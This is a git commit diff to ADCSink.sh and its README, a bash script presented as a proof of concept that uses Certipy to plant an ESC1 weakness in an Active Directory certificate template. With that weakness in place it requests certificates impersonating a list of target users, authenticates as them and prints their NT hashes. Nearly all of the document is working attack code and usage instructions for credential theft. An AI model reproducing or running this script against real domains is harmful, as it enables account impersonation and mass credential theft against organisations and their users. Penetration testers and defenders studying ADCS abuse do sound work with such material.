2a1a90d121ec1c4809198f81f79e51445efc821e
Prepouce <theobertrand2@protonmail.com>
2024-03-15 12:09:21 +0100

    Update

--- ADCSink.sh
+++ ADCSink.sh
@@ -3,14 +3,13 @@
 OPTIND=1         # Reset in case getopts has been used previously in the shell.
 # Initialize our own variables:
 output_file=""
-verbose=0
-while getopts "h?:v:u:p:d:T:t:i:U::c:H:" opt; do
+while getopts "h:?:v:u:p:d:T:t:i:U::c:H:s" opt; do
   case "$opt" in
     h|\?)
-      echo "./ADCSink.sh -u username -d domain -T template_name -t targeted_ca -c ca_name -i dc-ip -U targeted_users [-p password] [-H hash]"
+      echo "./ADCSink.sh -u username -d domain -T template_name -t targeted_ca -c ca_name -i dc-ip -U targeted_users [-p password] [-H hash] [-s] [-v]"
+      echo "-v: verbose mode"
+      echo "-s: do not modify certificate template, assume that ESC1 is already present"
       exit 0
-      ;;
-    v)  verbose=1
       ;;
     u)  username=$OPTARG
       ;;
@@ -30,6 +29,10 @@ while getopts "h?:v:u:p:d:T:t:i:U::c:H:" opt; do
       ;;
     c)  ca_name=$OPTARG
       ;;
+    s)  DoNotChangeTemplateConfiguration=1
+      ;;
+    v)  verbose=1
+      ;;
   esac
 done
 
@@ -46,16 +49,28 @@ fi
 
 execution_date=`date +%s`; output_dir='output_'$template'_'$execution_date
 mkdir $output_dir
-echo "> Updating the cert template " $template
-certipy template -u $username'@'$domain -template $template -save-old $cmd | tee -a $output_dir/logs.txt
-mv $template'.json' $output_dir
-echo "> Reading targeted users from the file: " $targeted_users
+touch $output_dir/logs.txt
+
+if [ ! $DoNotChangeTemplateConfiguration ]; then
+  echo "> \e[0;31m Modifying the certificate template \e[0m" $template | tee -a $output_dir/logs.txt
+  certipy template -u $username'@'$domain -template $template -save-old $cmd 2>/dev/null >> $output_dir/logs.txt
+  mv $template'.json' $output_dir
+  echo "The old certificate template is saved here: " $output_dir/$template'.json' | tee -a $output_dir/logs.txt
+fi
+echo "> \e[0;31m Reading targeted users from the file: \e[0m" $targeted_users | tee -a $output_dir/logs.txt
 for requested_user in `cat $targeted_users | cut -d '' -f 1`; do 
-	echo "> Requesting a certificate for:" $requested_user
-	certipy req -u $username'@'$domain $cmd  -target $targeted_ca -template $template -ca $ca_name -upn $requested_user'@'$domain -out $output_dir/$requested_user | tee -a $output_dir/logs.txt
-	echo "> Authenticating with a certificate for:" $requested_user
-        certipy auth -pfx $output_dir/$requested_user'.pfx' -dc-ip $dc_ip | tee -a $output_dir/logs.txt
+	echo "Request & auth for the user: " $requested_user
+	echo "  > \e[0;31m Requesting a certificate for: \e[0m" $requested_user | tee -a $output_dir/logs.txt
+	certipy req -u $username'@'$domain $cmd  -target $targeted_ca -template $template -ca $ca_name -upn $requested_user'@'$domain -out $output_dir/$requested_user 2>/dev/null >> $output_dir/logs.txt
+	echo "  > \e[0;31m Authenticating with a certificate for: \e[0m" $requested_user | tee -a $output_dir/logs.txt
+        certipy auth -pfx $output_dir/$requested_user'.pfx' -dc-ip $dc_ip 2>/dev/null >> $output_dir/logs.txt
 done
-certipy template -u $username'@'$domain $cmd -template $template -configuration $output_dir/$template'.json'
-echo "> This is your hashes: "
+if [ ! $DoNotChangeTemplateConfiguration ]; then
+  echo "> \e[0;31m Restoring the template certificate: \e[0m"$template | tee -a $output_dir/logs.txt
+  certipy template -u $username'@'$domain $cmd -template $template -configuration $output_dir/$template'.json' 2>/dev/null >> $output_dir/logs.txt
+fi
+echo "Find the certipy output here: " $output_dir/logs.txt  
+echo ""
+echo "This is your hashes: "
 grep "Got hash for" $output_dir/logs.txt 
+
--- README.md
+++ README.md
@@ -1,14 +1,25 @@
 # ADCSink
+
 A little and dirty bash script to POC a "NTDS dumping" technique. to do so, it adds an ESC1 vulnerability on a certificate template and retrieve NT&amp;LM hashes using UnPAC the hash method. 
 
-This script needs the tool Certipy to be installed to work :D. 
+This script is based on [Certipy](https://github.com/ly4k/Certipy) :D, you should installed it before running the script.
 
-## Usage 
+```text
+pip3 install certipy-ad
+```
 
-	./ADCSink.sh -u username -d domain -T template_name -t targeted_ca -c ca_name -i dc-ip -U targeted_users [-p password] [-H hash]
+## Usage
+
+```bash
+./ADCSink.sh -u username -d domain -T template_name -t targeted_ca -c ca_name -i dc-ip -U targeted_users [-p password] [-H hash]
+```
+
+## Similar projects
+
+[ADCsync](https://github.com/JPG0mez/ADCSync/blob/main/adcsync.py)
 
 
-## Common Errors 
+## Common Errors
 
 KDC_ERR_PADATA_TYPE_NOSUPP : It is not possible to authenticate using Kerberos (therefore UnPAC the hash method cannot be used). More information: https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html 
 
